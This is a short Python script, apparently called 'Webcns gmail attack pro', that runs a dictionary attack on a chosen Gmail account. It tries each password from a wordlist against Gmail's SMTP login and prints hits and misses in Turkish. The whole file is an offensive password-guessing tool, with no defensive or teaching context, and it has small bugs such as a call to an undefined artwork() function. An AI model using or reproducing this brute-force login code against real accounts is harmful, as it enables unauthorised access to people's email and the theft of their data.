import smtplib
from os import system
print("""
              _                    
             | |                   
__      _____| |__   ___ _ __  ___ 
\ \ /\ / / _ \ '_ \ / __| '_ \/ __|
 \ V  V /  __/ |_) | (__| | | \__ \
  \_/\_/ \___|_.__/ \___|_| |_|___/                                                
""")
print("\033[1;36mWebcns gmail attack pro\n")
artwork()

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter The Target Gmail Adress => ")

print("\n")

pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '2' to add a custom password list\n => ")

if pwd=='0':
    passswfile="Passwords.txt"

else :
    print("\n")
    passswfile = input("Name The File Path (For Password List) => ")

passswfile = open(passswfile, "r")

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print("[+] Parola Bulundu %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[!] Parola Yanlıs. %s " % password)